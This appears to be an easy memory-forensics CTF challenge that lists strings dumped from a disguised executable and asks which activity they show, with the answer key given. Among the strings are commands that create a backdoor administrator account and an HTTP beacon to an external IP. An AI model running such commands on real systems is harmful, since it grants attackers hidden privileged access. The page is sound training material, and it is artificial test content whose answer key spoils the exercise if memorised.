![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Easy CTF 2 - String Extraction

You dump the memory of a suspicious process and run `strings` against it. Among the output, you find the following lines:

```
cmd.exe /c whoami
cmd.exe /c net user hacker P@ssw0rd! /add
cmd.exe /c net localgroup administrators hacker /add
Mozilla/5.0 (Windows NT 10.0; Win64; x64)
GET /beacon HTTP/1.1
Host: 185.220.101.47
```

The process that owns this memory region is `invoice_april.pdf.exe`.

---

## Question

Based on the strings found in memory, what is the most accurate description of what this process was doing?

---

## Flags (Choose One)

- **A)** Creating a backdoor admin account and beaconing out to a C2 server
- **B)** Running a Windows Update in the background
- **C)** Performing a legitimate network connectivity check
- **D)** Scanning the local network for open ports

---

Correct Flag: **A**

---

# Finished?
[Next Challenge](MA_medium.md)  
[Back to Card's Main Page](../Memory_Analysis.md)
